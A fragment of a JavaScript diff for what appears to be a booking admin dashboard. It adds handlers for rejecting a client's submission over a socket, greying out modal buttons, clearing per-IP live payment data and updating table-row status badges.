+    if (socket) socket.emit('adminReject', { requestId, message: 'تم الرفض' });
+  }
+
+  // Gray out buttons, wait for client to re-enter data
+  grayModalButtons(stage);
+
+  // If payment rejected, clear all live data for this IP
+  if (stage === 'payment') {
+    delete liveData[ip];
+    delete liveStatus[ip];
+    updatePendingCount();
+    updateRowStatus(ip, null);
+  }
+}
+
+function grayModalButtons(stage) {
+  const actionsEl = document.getElementById(`modal-actions-${stage}`);
+  if (!actionsEl) return;
+  actionsEl.querySelectorAll('.btn-modal-action').forEach(btn => {
+    btn.className = 'btn-modal-action gray';
+  });
+}
+
+function updateRowStatus(ip, status) {
+  if (!ip) return;
+  const rows = document.querySelectorAll(`tr[data-ip="${ip}"]`);
+  rows.forEach(row => {
+    const cell = row.querySelector('.live-status-cell');
+    if (cell) {
+      cell.innerHTML = status ? getLiveStatusBadge(ip, status) : '';
+    }
+    if (status) {
+      row.classList.remove('row-live');
+      void row.offsetWidth;
+      row.classList.add('row-live');
+      setTimeout(() => row.classList.remove('row-live'), 3000);
+    }
+  });
+}
+
 function closeModal() {
   document.getElementById('detailsModal').classList.remove('show');
+  currentModalIp = null;
 }
 
 async function updateBookingStatus(bookingId, status) {
